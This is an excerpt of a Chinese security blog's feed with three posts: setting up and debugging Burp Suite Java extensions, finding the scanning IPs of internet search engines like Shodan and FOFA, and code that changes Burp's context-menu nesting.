class="hljs-name">manifestEntries</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">Built-By</span>&gt;</span>XX<span class="hljs-tag">&lt;/<span class="hljs-name">Built-By</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">manifestEntries</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">archive</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>net.portswigger.burp.extender<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>burp-extender-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.7.22<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>主要是加上了<code>build</code>和<code>dependencies</code>块。<code>dependencies</code>块引入BP插件API库，<code>build</code>块里配置<code>maven-shade-plugin</code>插件在打包时可以将项目的依赖也打入jar包里。</p><p>由于打包后的jar包里，<code>META-INF/MANIFEST.MF</code>文件的<code>Built-By</code>字段默认是本地计算机用户名，所以加上对<code>maven-jar-plugin</code>插件的配置，将<code>Built-By</code>字段值覆盖掉，避免信息泄露。</p><p>接着在源码目录（<code>src/main/java/</code>）下新建<code>burp</code>目录，再在<code>burp</code>目录下新建一个<code>BurpExtender</code>类，再复制官方提供的HelloWorld示例 <a href="https://github.com/PortSwigger/example-hello-world/blob/master/java/BurpExtender.java">BurpExtender.java</a> 代码过来。</p><p>然后点击IDEA右侧的Maven工具窗口 - 刷新按钮，让Maven重新加载配置文件，下载依赖库。</p><p><img src="burpsuite-java-extension-code-env-4.png" alt="burpsuite-java-extension-code-env-4.png"></p><p>如果一切OK，再点击运行<code>Lifecycle - package</code>，编译一个jar包出来。 这个jar包在项目根目录下的<code>target</code> 目录。用BurpSuite加载这个Jar（不是那个以<code>original-</code>开头的jar包），运行你的第一个BP插件吧。</p><p>如果修改pom.xml后编译，发现修改不生效，先刷新，再运行<code>Lifecycle - clean</code>，再<code>package</code>打包。</p><h3 id="调试插件"><a href="#调试插件" class="headerlink" title="调试插件"></a>调试插件</h3><p>简单的调试可以用打印输出。比如在上方用到的Hello World示例中，加上这两句调用BP提供的<code>IBurpExtenderCallbacks</code>接口方法：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">callbacks.printOutput(<span class="hljs-string">&quot;output&quot;</span>); <span class="hljs-comment">// 输出到 Extensions -&gt; Installed -&gt; 选择自己的插件 -&gt; Output</span><br>callbacks.printError(<span class="hljs-string">&quot;error&quot;</span>); <span class="hljs-comment">// 输出到 Extensions -&gt; Installed -&gt; 选择自己的插件 -&gt; Errors</span><br></code></pre></div></td></tr></table></figure><p>假如在编写或使用插件时，需频繁查看插件日志，可以保留着加载插件时弹出来的那个日志窗口。</p><p>打印调试法毕竟麻烦，还得用断点调试：</p><p>打开运行配置：</p><p><img src="burpsuite-java-extension-code-env-5.png" alt="burpsuite-java-extension-code-env-5.png"></p><p>新建一项<code>Remote JVM Debug</code>的运行配置，可以直接使用默认配置。其默认配置是：</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">Debugger mode:</span> <span class="hljs-string">Attach</span> <span class="hljs-string">to</span> <span class="hljs-string">remote</span> <span class="hljs-string">JVM</span><br><span class="hljs-attr">Transport:</span> <span class="hljs-string">Socket</span><br><span class="hljs-attr">Host:</span> <span class="hljs-string">localhost</span><br><span class="hljs-attr">Port:</span> <span class="hljs-number">5005</span><br></code></pre></div></td></tr></table></figure><p>运行BP时加上该参数：<code>-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005</code>。如：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">java -agentlib:jdwp=transport=dt_socket,server=y,<span class="hljs-built_in">suspend</span>=n,address=5005 -jar burpsuite.jar<br></code></pre></div></td></tr></table></figure><p>IDEA里执行刚添加的<code>Remote JVM Debug</code>配置，并下断点。 BP加载插件，运行到断点处就会断下。</p><p>另外建议在终端里执行命令来启动BP，因为有的异常你没捕获的话，异常堆栈会在终端里打印，在BP里的插件日志里是看不到的。</p><p>还有一个小tip：按住 <code>Ctrl</code> 或 <code>Command</code> 键并单击插件列表中某个插件的Loaded复选框可以重新加载插件。</p><h3 id="MacOS下的BP插件调试"><a href="#MacOS下的BP插件调试" class="headerlink" title="MacOS下的BP插件调试"></a>MacOS下的BP插件调试</h3><p>假如下载的是BP Mac版本的app（而不是单独的jar包），其自带OpenJDK。如果想用自带OpenJDK启动调试BP的话，就给 <code>Burp Suite Professional.app</code>里的 <code>vmoptions.txt</code> 文件加上一句：</p><figure class="highlight elm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elm">-agentlib:jdwp=trans<span class="hljs-keyword">port</span>=dt_socket,server=y,suspend=n,address=5005<br></code></pre></div></td></tr></table></figure><p>然而加上后，启动BP失败了。执行 <code>/Applications/Burp\ Suite\ Professional.app/Contents/MacOS/JavaApplicationStub</code>，可以看到报错：</p><figure class="highlight delphi"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs delphi">OpenJDK <span class="hljs-number">64</span>-Bit Server VM warning: Options -Xverify:none <span class="hljs-keyword">and</span> -noverify were <span class="hljs-keyword">deprecated</span> <span class="hljs-keyword">in</span> JDK <span class="hljs-number">13</span> <span class="hljs-keyword">and</span> will likely be removed <span class="hljs-keyword">in</span> a future release.<br>Error occurred during <span class="hljs-keyword">initialization</span> <span class="hljs-keyword">of</span> VM<br>Could <span class="hljs-keyword">not</span> find agent <span class="hljs-keyword">library</span> jdwp <span class="hljs-keyword">on</span> the <span class="hljs-keyword">library</span> path, <span class="hljs-keyword">with</span> error: dlopen(libjdwp.dylib, <span class="hljs-number">0</span>x0001): tried: <span class="hljs-string">&#x27;libjdwp.dylib&#x27;</span> (relative path <span class="hljs-keyword">not</span> allowed <span class="hljs-keyword">in</span> hardened <span class="hljs-keyword">program</span>), <span class="hljs-string">&#x27;/System/Volumes/Preboot/Cryptexes/OSlibjdwp.dylib&#x27;</span> (no such <span class="hljs-keyword">file</span>), <span class="hljs-string">&#x27;/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/server/./libjdwp.dylib&#x27;</span> (mach-o <span class="hljs-keyword">file</span>, but <span class="hljs-keyword">is</span> an incompatible architecture (have <span class="hljs-string">&#x27;x86_64&#x27;</span>, need <span class="hljs-string">&#x27;arm64&#x27;</span>)), <span class="hljs-string">&#x27;/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/server/../libjdwp.dylib&#x27;</span> (no such <span class="hljs-keyword">file</span>), <span class="hljs-string">&#x27;/usr/lib/libjdwp.dylib&#x27;</span> (no such <span class="hljs-keyword">file</span>, <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> dyld cache), <span class="hljs-string">&#x27;libjdwp.dylib&#x27;</span> (relative path <span class="hljs-keyword">not</span> allowed <span class="hljs-keyword">in</span> hardened <span class="hljs-keyword">program</span>), <span class="hljs-string">&#x27;/usr/lib/libjdwp.dylib&#x27;</span> (no such <span class="hljs-keyword">file</span>, <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> dyld cache)<br></code></pre></div></td></tr></table></figure><p>提示缺少<code>libjdwp.dylib</code>库文件。我的解决方式是：</p><ol><li><p>执行<code>/Applications/Burp\ Suite\ Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java -version</code>，先看下OpenJDK的版本，是openjdk 19.0.2：</p> <figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">openjdk</span> version <span class="hljs-string">&quot;19.0.2&quot;</span> <span class="hljs-number">2023</span>-<span class="hljs-number">01</span>-<span class="hljs-number">17</span><br><span class="hljs-attribute">OpenJDK</span> Runtime Environment (build <span class="hljs-number">19</span>.<span class="hljs-number">0</span>.<span class="hljs-number">2</span>+<span class="hljs-number">7</span>-<span class="hljs-number">44</span>)<br><span class="hljs-attribute">OpenJDK</span> <span class="hljs-number">64</span>-Bit Server VM (build <span class="hljs-number">19</span>.<span class="hljs-number">0</span>.<span class="hljs-number">2</span>+<span class="hljs-number">7</span>-<span class="hljs-number">44</span>, mixed mode)<br></code></pre></div></td></tr></table></figure></li><li><p>到 <a href="https://www.oracle.com/java/technologies/javase/jdk19-archive-downloads.html">https://www.oracle.com/java/technologies/javase/jdk19-archive-downloads.html</a> 下载一个对应版本的jdk包。（注意自己的CPU架构是x64还是Arm 64）</p></li><li><p>解压刚下载的jdk包，并将 <code>libjdwp.dylib</code> 和 <code>libdt_socket.dylib</code>文件拷贝到<code>Burp Suite Professional.app</code>里：</p> <figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">cp <span class="hljs-regexp">/Users/</span>ovie<span class="hljs-regexp">/Downloads/</span>jdk-<span class="hljs-number">19.0</span>.<span class="hljs-number">2</span>.jdk<span class="hljs-regexp">/Contents/</span>Home<span class="hljs-regexp">/lib/</span>libjdwp.dylib <span class="hljs-regexp">/Applications/</span>Burp\ Suite\ Professional.app<span class="hljs-regexp">/Contents/</span>Resources<span class="hljs-regexp">/jre.bundle/</span>Contents<span class="hljs-regexp">/Home/</span>lib<span class="hljs-regexp">/server/</span>libjdwp.dylib<br><br>cp <span class="hljs-regexp">/Users/</span>ovie<span class="hljs-regexp">/Downloads/</span>jdk-<span class="hljs-number">19.0</span>.<span class="hljs-number">2</span>.jdk<span class="hljs-regexp">/Contents/</span>Home<span class="hljs-regexp">/lib/</span>libdt_socket.dylib <span class="hljs-regexp">/Applications/</span>Burp\ Suite\ Professional.app<span class="hljs-regexp">/Contents/</span>Resources<span class="hljs-regexp">/jre.bundle/</span>Contents<span class="hljs-regexp">/Home/</span>lib<span class="hljs-regexp">/server/</span>libdt_socket.dylib<br></code></pre></div></td></tr></table></figure></li></ol><p>附：之前遇到的一个问题，OpenJDK里没有 <code>com.sun.net.httpserver.HttpServer</code> 这个类（在Oracle JDK里，这个类在 <code>rt.jar</code>），如果BP插件里用此类启动http服务，会报 <code>java.lang.NoClassDefFoundError: com/sun/net/httpserver/HttpServer</code>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;BurpSuite插件可以使用Java、Python或Ruby来编写，因为BurpSuite（以下简称为BP或Burp）本身是用Java写的，通常插件的开发也是用Java来编写。如果用Python编写，还要安装Jython，而且在安装一些Python模块时可能会报错，加上目</summary>
      
    
    
    
    
    <category term="Burpsuite" scheme="https://ovi3.github.io/tags/Burpsuite/"/>
    
    <category term="Web安全" scheme="https://ovi3.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
    <category term="Java" scheme="https://ovi3.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>如何找出网络空间测绘引擎扫描客户端IP</title>
    <link href="https://ovi3.github.io/2023/12/29/find-cyberspace-search-engine/"/>
    <id>https://ovi3.github.io/2023/12/29/find-cyberspace-search-engine/</id>
    <published>2023-12-29T06:50:00.000Z</published>
    <updated>2024-07-21T05:46:47.684Z</updated>
    
    <content type="html"><![CDATA[<p>年底了，水一篇文章。目前的网络空间测绘引擎有fofa、shodan、zoomeye、hunter、censys等，这篇文章主要写写如何找出它们的扫描客户端IP与UDP probe数据包。</p><h3 id="自己公开"><a href="#自己公开" class="headerlink" title="自己公开"></a>自己公开</h3><p>比如 Censys 公开了自己的扫描客户端ip：<a href="https://support.censys.io/hc/en-us/articles/360043177092-Opt-Out-of-Data-Collection">https://support.censys.io/hc/en-us/articles/360043177092-Opt-Out-of-Data-Collection</a></p><h3 id="第三方平台"><a href="#第三方平台" class="headerlink" title="第三方平台"></a>第三方平台</h3><p>网上一些平台也收集了一些：</p><ul><li>fapro ：<a href="https://faweb.fofapro.com/classification/">https://faweb.fofapro.com/classification/</a></li><li>GreyNoise：<a href="https://viz.greynoise.io/query?gnql=actor%3AShodan.io">https://viz.greynoise.io/query?gnql=actor%3AShodan.io</a> ， 这个站点还分析了相似IP， 如 <a href="https://viz.greynoise.io/ip/159.65.111.154">https://viz.greynoise.io/ip/159.65.111.154</a> 这个 BinaryEdge 的ip，点击页面的View Similar IPs 可以大概看看可能是 BinaryEdge 的其他IP（该功能需登录订阅）</li></ul><p>通过搜索引擎搜索也可以搜索到一些，如shodan扫描器的ip：</p><ul><li><a href="https://gist.github.com/jfqd/4ff7fa70950626a11832a4bc39451c1c">https://gist.github.com/jfqd/4ff7fa70950626a11832a4bc39451c1c</a></li><li><a href="https://wiki.ipfire.org/configuration/firewall/blockshodan">https://wiki.ipfire.org/configuration/firewall/blockshodan</a></li></ul><h3 id="回显ip的服务"><a href="#回显ip的服务" class="headerlink" title="回显ip的服务"></a>回显ip的服务</h3><p>互联网上有一些服务会输出来访者的ip，那如何找到这类服务呢。</p><p>利用公开的扫描客户端IP去它的搜索引擎里去搜索。  如：</p><ul><li>使用shodan的ip去shodan搜索 <a href="https://www.shodan.io/search?query=%2271.6.167.142%22+-Ethereum+-NTP">“71.6.167.142” -Ethereum -NTP</a>，  可提取出这个特征 <a href="https://www.shodan.io/search?query=http.html%3A%22Outlook+Logon%22+http.html%3A%22Never+gonna+give+you+up%22">http.html:”Outlook Logon” http.html:”Never gonna give you up”</a> 的服务会回显IP（这些服务看着好像是蜜罐）</li><li>使用censys公开的网段去censys搜索，<a href="https://search.censys.io/search?resource=hosts&sort=RELEVANCE&per_page=25&virtual_hosts=EXCLUDE&q=services.http.response.body%3A+%22162.142.125%22&ref=censysgpt">services.http.response.body: “162.142.125”</a>，可以提取出一些特征，如：<a href="https://search.censys.io/search?resource=hosts&sort=RELEVANCE&per_page=25&virtual_hosts=EXCLUDE&q=services%3A%28http.response.body%3A+%22%E4%BD%A0%E7%9A%84IP%EF%BC%9A%22+and+port%3A80%29">services:(http.response.body: “你的IP：” and port:80)</a></li></ul><p>而Fofa会将自己的IP给替换成 <code>*.*.*.*</code>，像 <a href="https://fofa.info/result?qbase64=aXMgbm90IGFsbG93ZWQgIHRvIGNvbm5lY3QgdG8gdGhpcyBNeVNRTCBzZXJ2ZXI%3D">“is not allowed to connect to this MySQL server”</a> 。 那是不是可以用 <code>&quot;*.*.*.*&quot;</code>搜索出那些回显IP的服务呢。测试了下并不行，估计是分词搜索的原因。</p><p>而zoomeye会把自己的ip替换为<code>xxx.xxx.xxx.xxx</code>，可以使用 <a href="https://www.zoomeye.org/searchResult?q=%22xxx.xxx.xxx.xxx%22">“xxx.xxx.xxx.xxx”</a>去搜索。</p><p>后面我也注意到，其实fofa跟zoomeye的替换并不全面。fofa没有替换http响应里的ip，像 <a href="https://fofa.info/result?qbase64=IkJhZCBSZXF1ZXN0IiAmJiAiaXAi">“Bad Request” &amp;&amp; “ip”</a> ，<a href="https://fofa.info/result?qbase64=aGVhZGVyPSJ4LXJlcXVlc3QtaXAiIA%3D%3D">header=”x-request-ip”</a> 。且对于一些被截取、被编码的ip或其他格式的ip，也不会替换到。</p><p>要找到这些回显IP的服务，也可以自己全网扫一遍看哪些服务会回显自己的ip，记录下来。</p><h3 id="UDP-Probe数据包"><a href="#UDP-Probe数据包" class="headerlink" title="UDP Probe数据包"></a>UDP Probe数据包</h3><p>对于UDP服务的识别需要发送一个该协议的probe包，在互联网上有一些机器起的是echo服务，就是你发什么它就回复什么。像 <a href="https://fofa.info/result?qbase64=YmFzZV9wcm90b2NvbD0idWRwIiAmJiBwb3J0PSIyNDI1IiAmJiBiYW5uZXI9InRlc3Q6UEM6MzI6Z3JhYiB0ZXN0Ig%3D%3D">base_protocol=”udp” &amp;&amp; port=”2425” &amp;&amp; banner=”test:PC:32:grab test”</a> ，<a href="https://fofa.info/result?qbase64=IkdFVCAvIEhUVFAvMS4xIiAmJiAiQWNjZXB0OiAqLyoiICYmIHByb3RvY29sPSJ1bmtub3duIg%3D%3D">“GET / HTTP/1.1” &amp;&amp; “Accept: <em>/</em>“ &amp;&amp; protocol=”unknown”</a> ，<a href="https://hunter.qianxin.com/list?search=protocol%3D%3D%22echo%22&conditions=">protocol==”echo”</a> 。区分出这些机器后，再用这些机器ip去搜索可以大概知道各扫描客户端对不同UDP端口发的是什么UDP包。</p><h3 id="部署蜜罐"><a href="#部署蜜罐" class="headerlink" title="部署蜜罐"></a>部署蜜罐</h3><p>自己部署蜜罐成本大，没弄过。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;年底了，水一篇文章。目前的网络空间测绘引擎有fofa、shodan、zoomeye、hunter、censys等，这篇文章主要写写如何找出它们的扫描客户端IP与UDP probe数据包。&lt;/p&gt;
&lt;h3 id=&quot;自己公开&quot;&gt;&lt;a href=&quot;#自己公开&quot; class=&quot;he</summary>
      
    
    
    
    
    <category term="网络空间测绘" scheme="https://ovi3.github.io/tags/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%B5%8B%E7%BB%98/"/>
    
  </entry>
  
  <entry>
    <title>Burpsuite 插件开发 - 修改右键菜单层级</title>
    <link href="https://ovi3.github.io/2023/09/27/burpsuite-extension-menu-level/"/>
    <id>https://ovi3.github.io/2023/09/27/burpsuite-extension-menu-level/</id>
    <published>2023-09-27T14:41:00.000Z</published>
    <updated>2024-07-21T05:46:47.586Z</updated>
    
    <content type="html"><![CDATA[<p>BurpSuite新版本中，插件注册的右键菜单在 Extensions -&gt; 插件名 -&gt; 插件菜单 ，点起来比较麻烦。测了几个BurpSuite版本，这个更改在下面几个版本改的：</p><ul><li>v2021.7： 第三层。右键 - Extensions -&gt; 插件名 -&gt; 插件菜单</li><li>v2021.4、v2021.5、v2021.6： 第二层。右键 - Extensions - 插件菜单</li><li>v2021.3： 第一层。右键 - 插件菜单</li></ul><p>写了个小插件 <a href="https://github.com/Ovi3/burp-menu-level">BurpMenuLevel</a> ，用来修改右键插件菜单层级的。这个插件适用于v2021.7及之后的版本。</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>如果插件要添加右键菜单，需要实现<code>IContextMenuFactory</code>接口的<code>public List&lt;JMenuItem&gt; createMenuItems(IContextMenuInvocation invocation)</code>方法，并调用<code>callbacks.registerContextMenuFactor</code>方法来注册。</p><p>每次在Repeater界面或其它地方上右键，Burp就会调用<code>createMenuItems</code>方法来获取菜单列表，然后添加到<code>插件名</code>的子菜单里，再将<code>插件名</code>菜单加到<code>Extensions</code>的子菜单里。</p><p>想了一种实现方式：监听自己插件菜单的父组件更改事件（<code>HierarchyEvent</code>事件），就可以获取其父组件<code>插件名</code>菜单，同理，再监听<code>插件名</code>菜单，获取<code>Extensions</code>菜单，再监听<code>Extensions</code>菜单，获取第一层的整个右键菜单，获取到这个之后，整个菜单就可以随意修改。</p><p>三层事件监听：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changeContextMenuLevel</span><span class="hljs-params">(List&lt;JMenuItem&gt; myMenus, <span class="hljs-type">int</span> level)</span> &#123;<br>    <span class="hljs-keyword">if</span> (myMenus.size() == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-type">JMenuItem</span> <span class="hljs-variable">flagMenu</span> <span class="hljs-operator">=</span> myMenus.get(<span class="hljs-number">0</span>);<br>    flagMenu.addHierarchyListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HierarchyListener</span>() &#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">ran</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hierarchyChanged</span><span class="hljs-params">(HierarchyEvent e)</span> &#123;<br>            <span class="hljs-keyword">if</span> ((e.getChangeFlags() &amp; HierarchyEvent.PARENT_CHANGED) != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">if</span> (!ran) &#123;<br>                    ran = <span class="hljs-literal">true</span>;<br>                    <span class="hljs-keyword">if</span> (flagMenu.getParent() == <span class="hljs-literal">null</span> || !(flagMenu.getParent() <span class="hljs-keyword">instanceof</span> JPopupMenu)) &#123;<br>                        <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                    <span class="hljs-type">JPopupMenu</span> <span class="hljs-variable">popupMenu</span> <span class="hljs-operator">=</span> (JPopupMenu) flagMenu.getParent();<br>                    <span class="hljs-type">Component</span> <span class="hljs-variable">invoker</span> <span class="hljs-operator">=</span> popupMenu.getInvoker();<br><br>                    <span class="hljs-keyword">if</span> (!(invoker <span class="hljs-keyword">instanceof</span> JMenuItem) || !((JMenuItem) invoker).getText().equals(extensionName)) &#123;<br>                        <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                    <span class="hljs-type">JMenuItem</span> <span class="hljs-variable">extensionNameMenuItem</span> <span class="hljs-operator">=</span> (JMenuItem)invoker;<br>                    extensionNameMenuItem.addHierarchyListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HierarchyListener</span>() &#123;<br>                        <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">ran2</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>                        <span class="hljs-meta">@Override</span><br>                        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hierarchyChanged</span><span class="hljs-params">(HierarchyEvent e)</span> &#123;<br>                            <span class="hljs-keyword">if</span> ((e.getChangeFlags() &amp; HierarchyEvent.PARENT_CHANGED) != <span class="hljs-number">0</span>) &#123;<br>                                <span class="hljs-keyword">if</span> (!ran2) &#123;<br>                                    ran2 = <span class="hljs-literal">true</span>;<br><br>                                    <span class="hljs-keyword">if</span> (extensionNameMenuItem.getParent() == <span class="hljs-literal">null</span> || !(extensionNameMenuItem.getParent() <span class="hljs-keyword">instanceof</span> JPopupMenu)) &#123;<br>                                        <span class="hljs-keyword">return</span>;<br>                                    &#125;<br>                                    <span class="hljs-type">JPopupMenu</span> <span class="hljs-variable">extensionsPopupMenu</span> <span class="hljs-operator">=</span> (JPopupMenu) extensionNameMenuItem.getParent();<br><br>                                    <span class="hljs-type">Component</span> <span class="hljs-variable">invoker2</span> <span class="hljs-operator">=</span> extensionsPopupMenu.getInvoker();<br><br>                                    <span class="hljs-keyword">if</span> (!(invoker2 <span class="hljs-keyword">instanceof</span> JMenuItem) || !((JMenuItem) invoker2).getText().equals(<span class="hljs-string">&quot;Extensions&quot;</span>)) &#123;<br>                                        <span class="hljs-keyword">return</span>;<br>                                    &#125;<br>                                    <span class="hljs-type">JMenuItem</span> <span class="hljs-variable">extensionsMenuItem</span> <span class="hljs-operator">=</span> (JMenuItem) invoker2;<br>                                    extensionsMenuItem.addHierarchyListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HierarchyListener</span>() &#123;<br>                                        <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">ran3</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br><br>                                        <span class="hljs-meta">@Override</span><br>                                        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hierarchyChanged</span><span class="hljs-params">(HierarchyEvent e)</span> &#123;<br>                                            <span class="hljs-keyword">if</span> ((e.getChangeFlags() &amp; HierarchyEvent.PARENT_CHANGED) != <span class="hljs-number">0</span>) &#123;<br>                                                <span class="hljs-keyword">if</span> (!ran3) &#123;<br>                                                    ran3 = <span class="hljs-literal">true</span>;<br><br>                                                    <span class="hljs-keyword">if</span> (extensionsMenuItem.getParent() == <span class="hljs-literal">null</span> || !(extensionsMenuItem.getParent() <span class="hljs-keyword">instanceof</span> JPopupMenu)) &#123;<br>                                                        <span class="hljs-keyword">return</span>;<br>                                                    &#125;<br>                                                    extensionsPopupMenu.remove(extensionNameMenuItem);  <span class="hljs-comment">// 移除自身插件菜单</span><br><br>                                                    <span class="hljs-type">JPopupMenu</span> <span class="hljs-variable">topLevelPopupMenu</span> <span class="hljs-operator">=</span> (JPopupMenu) extensionsMenuItem.getParent();<br><br>                                                    <span class="hljs-comment">// 拿到 extensionsPopupMenu、topLevelPopupMenu 就能为所欲为了</span><br><span class="hljs-comment">// 整个右键菜单都可以修改，如添加Covert selection编码方式等</span><br><br>                                                &#125;<br>                                            &#125;<br>                                        &#125;<br>                                    &#125;);<br><br>                                &#125;<br>                            &#125;<br>                        &#125;<br>                    &#125;);<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;);<br><br>&#125;<br></code></pre></div></td></tr></table></figure><p>另一种可能可行的方式是，注册一个<code>AWTEventListener</code>监听整个GUI的事件是获取右键菜单对象。这种方式我没去试。</p><h2 id="插件截图"><a href="#插件截图" class="headerlink" title="插件截图"></a>插件截图</h2><p>默认的菜单层级：</p><p><img src="burpsuite-extension-menu-level-0.png" alt=""></p><p>设置下：</p><p><img src="burpsuite-extension-menu-level-1.png" alt=""></p><p>修改后的效果：</p><p><img src="burpsuite-extension-menu-level-2.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;BurpSuite新版本中，插件注册的右键菜单在 Extensions -&amp;gt; 插件名 -&amp;gt; 插件菜单 ，点起来比较麻烦。测了几个BurpSuite版本，这个更改在下面几个版本改的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;v2021.7： 第三层。右键 - Extension</summary>
      
    
    
    
    
    <category term="Burpsuite" scheme="https://ovi3.github.io/tags/Burpsuite/"/>
    
    <category term="Web安全" scheme="https://ovi3.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>苹果电脑使用笔记</title>
    <link href="https://ovi3.github.io/2023/07/28/macbook-pro-use-note/"/>
    <id>https://ovi3.github.io/2023/07/28/macbook-pro-use-note/</id>
    <published>2023-07-28T14:53:00.000Z</published>
    <updated>2024-07-21T05:46:47.712Z</updated>
    
